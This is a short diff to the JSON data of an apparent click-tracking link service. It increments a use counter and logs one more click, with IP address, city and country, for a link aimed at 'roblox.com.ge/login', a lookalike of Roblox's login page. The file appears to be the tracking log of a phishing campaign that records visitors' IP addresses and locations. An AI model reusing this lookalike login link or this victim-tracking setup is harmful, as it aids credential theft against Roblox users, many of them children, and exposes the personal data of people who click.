@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1189,
+    "useCount": 1190,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9656,6 +9656,14 @@
         "city": "Itajubá",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777301541751,
+        "ip": "79.106.26.1",
+        "country": "Albania",
+        "city": "Tirana",
+        "flag": "🇦🇱",
+        "countryCode": "AL"
       }
     ]
   },
